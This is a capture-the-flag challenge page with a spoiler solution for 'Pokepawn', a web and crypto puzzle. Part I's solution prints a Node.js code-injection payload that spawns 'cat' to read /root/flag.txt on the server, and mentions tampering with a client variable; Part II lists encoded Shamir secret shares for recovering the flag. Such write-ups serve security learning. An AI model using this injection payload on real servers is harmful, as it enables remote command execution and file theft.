# Pokepawn
**Category:** web,crypto,misc

**Author:** \_Roko'sBasilisk\_

## Description (Pokepawn I)

Chess is more than just a table game... Can you catch 'em all and become the PokePawn master?

## Description (Pokepawn II)

And if you do catch 'em all... Please share your secrets with us!

## Credits:

Huge thanks to [cerulebell](https://www.deviantart.com/cerulebell) for letting me use his amazing chess-like pokemon illustrations!

## Points
500

## Solution

<details>
 <summary>Reveal Spoiler</summary>

### Solution for PokePawn I
Steps to solve:

1. Catch all pokepawns. (alternativerly you can tamper with the $gameSwitches client variable and change the switches to true)

2. Go to signup for the tournament and use the following payload:
`#{process.mainModule.require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout}`

### Solution for PokePawn II
Gather all Shamir's secret sharing shares.

```
1-596c042805f58c6106a7a82db9912e430e9606ce444012cdd8a8f52aac90e332ca6c601a61 
2-d6e485ab4d003895d4138077afd0dd50b4279ce7978cbe1be1670de47d1206603f8b8b1bb8 -- BASE32 -> GIWWINTFGQ4DKYLCGRSDAMBTHA4TKZBUGEZTQMBXG5QWMZBQMRSDKMDCGQZDOOLDMU3TSNZYMNRGKMLCMUYTMNZQMRSTIN3EGEZDANRWGAZWMODCHBRDCYTCHA======
3-d341b5f99464863a27ea0a0102ce357d72c965d39a7110aa310c8b9f18ddeec43fd61e051a -- BINARY -> 00110011 00101101 01100100 00110011 00110100 00110001 01100010 00110101 01100110 00111001 00111001 00110100 00110110 00110100 00111000 00110110 00110011 01100001 00110010 00110111 01100101 01100001 00110000 01100001 00110000 00110001 00110000 00110010 01100011 01100101 00110011 00110101 00110111 01100100 00110111 00110010 01100011 00111001 00110110 00110101 01100100 00110011 00111001 01100001 00110111 00110001 00110001 00110000 01100001 01100001 00110011 00110001 00110000 01100011 00111000 01100010 00111001 01100110 00110001 00111000 01100100 01100100 01100101 01100101 01100011 00110100 00110011 01100110 01100100 00110110 00110001 01100101 00110000 00110101 00110001 01100001
4-422a1dedb8024384fcb216863f683e557344207a0e961b07b9fc001c7d7b4be7a2c704ddfa -- ASCII85 -> 1bCO>11;nJARo700JYI@3&G5W@PTYr3&WR)2E3L(2)R<K1c-sA2dnCO3ArU$0K3H$An*MK0k3.Q2e"UQAN+$Q@lH(uA7T:\

```
Use them to get teh flag using this:
http://point-at-infinity.org/ssss/

</details>
